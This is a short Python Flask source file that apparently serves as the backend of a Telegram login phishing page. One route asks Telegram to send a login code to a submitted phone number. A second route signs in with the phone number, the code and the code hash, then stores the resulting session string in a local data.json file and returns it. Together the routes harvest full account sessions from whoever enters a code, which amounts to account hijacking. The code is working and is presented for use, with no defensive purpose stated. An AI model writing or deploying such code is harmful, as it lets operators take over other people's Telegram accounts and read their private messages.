# api/send_code.py
from flask import Flask, request, jsonify
from telethon import TelegramClient
from telethon.sessions import StringSession
import os, json

app = Flask(__name__)

# ENV — WAJIB!
API_ID = int(os.getenv('API_ID'))
API_HASH = os.getenv('API_HASH')
SESSION_STRING = os.getenv('SESSION_STRING')  # AKUN LO!

DATA_FILE = 'data.json'

def load(): 
    return json.load(open(DATA_FILE, 'r')) if os.path.exists(DATA_FILE) else {}
def save(d): 
    json.dump(d, open(DATA_FILE, 'w'), indent=2)

@app.route('/send_code', methods=['POST'])
async def send_code():
    phone = request.form.get('phone')
    if not phone or not SESSION_STRING:
        return jsonify({'success': False, 'error': 'missing'})

    client = TelegramClient(StringSession(SESSION_STRING), API_ID, API_HASH)
    await client.connect()
    try:
        res = await client.send_code_request(phone)
        return jsonify({'success': True, 'hash': res.phone_code_hash})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})
    finally:
        await client.disconnect()

@app.route('/login', methods=['POST'])
async def login():
    phone = request.form.get('phone')
    code = request.form.get('code')
    hash_code = request.form.get('hash')
    if not all([phone, code, hash_code, SESSION_STRING]):
        return jsonify({'success': False, 'error': 'missing'})

    client = TelegramClient(StringSession(SESSION_STRING), API_ID, API_HASH)
    await client.connect()
    try:
        await client.sign_in(phone, code=code, phone_code_hash=hash_code)
        sess = client.session.save()
        data = load()
        data[phone] = {'session': sess}
        save(data)
        return jsonify({'success': True, 'session': sess})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})
    finally:
        await client.disconnect()

if __name__ == "__main__":
    app.run()
